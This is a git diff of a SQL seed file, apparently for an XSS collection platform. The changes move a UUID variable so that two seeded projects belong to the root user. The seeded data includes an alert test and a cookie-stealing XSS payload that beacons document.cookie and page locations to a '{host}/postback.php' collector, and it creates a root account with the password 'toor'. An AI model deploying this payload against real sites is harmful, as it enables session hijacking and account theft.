@@ -50,6 +50,8 @@ CREATE TABLE `modules` (
 -- Dumping data for table `modules`
 --
 
+set @root_uuid=uuid();
+
 INSERT INTO `modules` (`guid`, `module_name`, `payload`) VALUES
 ('2ac3a5c7-6f17-4768-beab-324a82e75458', '弹窗测试', 'alert(&quot;xss&quot;)'),
 ('df803ba4-e35b-47cc-b0be-8374f2e75210', '读取COOKIE', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);');
@@ -73,8 +75,8 @@ CREATE TABLE `project` (
 --
 
 INSERT INTO `project` (`guid`, `user_guid`, `project_name`, `timestamp`, `payload`) VALUES
-('5WDCa1', '7032c695-f961-4144-b17c-2edc979cc5da', '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
-('Hq5Cu9', '7032c695-f961-4144-b17c-2edc979cc5da', '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');
+('5WDCa1', @root_uuid, '回传Cookie', '2020-06-20 07:19:13', 'var x=new Image();\r\ntry\r\n{\r\nvar myopener=&#039;&#039;;\r\nmyopener=window.opener &amp;&amp; window.opener.location ? window.opener.location : &#039;&#039;;\r\n}\r\ncatch(err)\r\n{\r\n}\r\nx.src=&#039;{host}/postback.php?id={projectId}&amp;location=&#039;+escape(document.location)+&#039;toplocation=&#039;+escape(top.document.location)+&#039;&amp;cookie=&#039;+escape(document.cookie);'),
+('Hq5Cu9', @root_uuid, '弹窗测试', '2020-06-19 11:30:10', 'alert(&quot;xss&quot;)');
 
 -- --------------------------------------------------------
 
@@ -107,8 +109,6 @@ CREATE TABLE `user` (
 --
 -- Dumping data for table `user`
 --
-
-set @root_uuid=uuid();
 
 INSERT INTO `user` (`guid`, `username`, `password`, `nickname`) VALUES (@root_uuid, 'root', md5(concat(md5('toor'),@root_uuid)), '盘古大帝');
 
